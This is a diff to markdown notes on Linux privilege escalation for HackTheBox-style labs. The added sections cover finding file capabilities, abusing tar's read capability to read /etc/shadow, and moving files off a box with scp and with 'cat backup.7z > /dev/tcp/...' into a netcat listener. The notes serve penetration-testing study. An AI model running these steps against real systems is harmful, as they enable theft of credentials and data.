@@ -247,6 +247,19 @@ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -uid 0 -perm -4000 -type f 2>/dev/null
 ```
 
+## Capabilities
+
+- https://linux-audit.com/linux-capabilities-101/
+- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/HTB-Lightweight
+
+Find out what capabilities are Enabled: `getcap -r / 2>/dev/null`
+
+![](https://i.imgur.com/SlwkawP.png)
+
+A classic example…
+
+Let’s say tar has “tar = cap_dac_read_search+ep” which means tar has read access to anything. We can abuse this to read /etc/shadow by utilising the function of archiving a file.
+
 
 ## Automated Tools
 
@@ -266,11 +279,30 @@ find / -uid 0 -perm -4000 -type f 2>/dev/null
 **Linux Priv Checker** - https://github.com/sleventyeleven/linuxprivchecker
   
 
+## File Transfer
+### scp
 
+`scp 10.10.14.17@lightweight.htb:/tmp/listen.pcap .`
   
-  
+![](https://i.imgur.com/QBsXWN3.png)
 
-### Developing your shell
+
+### nc
+
+With **netcat** listener running locally on Kali machine, I sent the contents of **backup.7z** file over the network to the listener running on the local machine:
+
+`cat backup.7z > /dev/tcp/10.10.14.17/9001`
+
+![](https://i.imgur.com/BWu6t6d.png)
+
+Now on my local listener, the data receieved by Netcat is redirected to a file named backup.7z:
+
+`nc -lvnp 9001 > backup.7z`
+
+![](https://i.imgur.com/FtwfYyu.png)
+
+
+## Developing your shell
   
 
 - Python pty module:
